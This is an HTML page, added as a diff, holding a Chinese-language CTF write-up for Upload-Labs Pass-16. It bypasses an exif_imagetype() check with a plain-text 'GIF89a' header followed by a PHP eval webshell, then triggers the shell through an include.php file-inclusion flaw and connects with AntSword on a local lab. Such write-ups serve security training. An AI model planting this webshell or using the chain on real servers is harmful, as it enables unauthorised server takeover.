@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【Upload-Labs】Pass-16 exif_imagetype 检测与文件包含 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【Upload-Labs】Pass-16 exif_imagetype 检测与文件包含 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.11.03 | <strong>分类：</strong>CTF | <strong>标签：</strong>Upload-Labs, Web, 文件上传, exif_imagetype, 文件包含, WebShell</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>Upload-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - 文件上传</li>
+        <li><strong>题目名称：</strong>Pass-16 (exif_imagetype 检测 + 文件包含)</li>
+        <li><strong>提示：</strong>服务端使用 <code>exif_imagetype()</code> 验证图片，必须绕过检测并利用 <code>include.php</code> 触发执行。</li>
+    </ul>
+
+    <h2>2. 核心原理与前置分析</h2>
+    <p>本关卡源码使用 <code>exif_imagetype()</code> 函数对上传文件进行校验。与上一关的 <code>getimagesize()</code> 不同，<code>exif_imagetype()</code> <strong>仅读取文件的前几个字节（魔数）</strong>，不解析宽高结构。</p>
+    <p>因此，我们可以直接使用纯文本伪造文件头（如 <code>GIF89a</code>），并在其后拼接 PHP 代码。由于文件全为纯文本，不包含任何导致 PHP 引擎崩溃的二进制乱码，文件被包含时能够完美执行。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <h3>工具配置：中国蚁剑</h3>
+    <ul>
+        <li><strong>URL 地址：</strong><code>http://127.0.0.1:8081/include.php?file=upload/真实文件名.gif</code></li>
+        <li><strong>连接密码：</strong><code>cmd</code>；<strong>编码：</strong>UTF-8。</li>
+    </ul>
+
+    <h3>操作步骤与解析：</h3>
+    
+    <p><strong>第一步：制作纯文本图片马</strong></p>
+    <p>新建一个文本文档，写入以下内容（保存为 UTF-8 无 BOM 格式）：</p>
+    <pre>GIF89a
+&lt;?php @eval($_POST['cmd']); ?&gt;</pre>
+    <p>将文件重命名为 <code>test16.gif</code>。</p>
+
+    <p><strong>第二步：上传并获取真实路径</strong></p>
+    <p>在 Pass-16 页面上传该文件。服务端读取到 <code>GIF89a</code> 魔数，判定为合法 GIF 并放行。右键点击页面上的破图，复制其真实 URL 路径（如 <code>6020261103184833.gif</code>）。</p>
+
+    <p><strong>第三步：包含触发与连接</strong></p>
+    <p>浏览器访问 <code>http://127.0.0.1:8081/include.php?file=upload/6020261103184833.gif</code>。页面输出 <code>GIF89a</code>，无报错。</p>
+    <p>打开蚁剑，填入该包含地址，密码为 <code>cmd</code>，测试连接成功，获取服务器权限。随后清理上传的文件。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>魔数检测的局限性：</strong><code>exif_imagetype()</code> 的安全级别极低，仅靠伪造开头几个字节就能绕过。在 CTF 实战中，遇到此类函数校验，优先考虑纯文本构造文件头。</li>
+        <li><strong>包含时的编码安全：</strong>使用纯文本 <code>GIF89a</code> 配合 PHP 代码，完美规避了二进制图片被包含时可能导致的 <code>Parse error</code>。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>exif_imagetype 绕过</strong>：理解该函数只读取文件头魔数的特性，可通过纯文本伪造 <code>GIF89a</code> 实现绕过。</li>
+        <li><strong>文件包含漏洞</strong>：通过 <code>include.php</code> 触发恶意文件执行，是典型的“上传+包含”组合漏洞。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
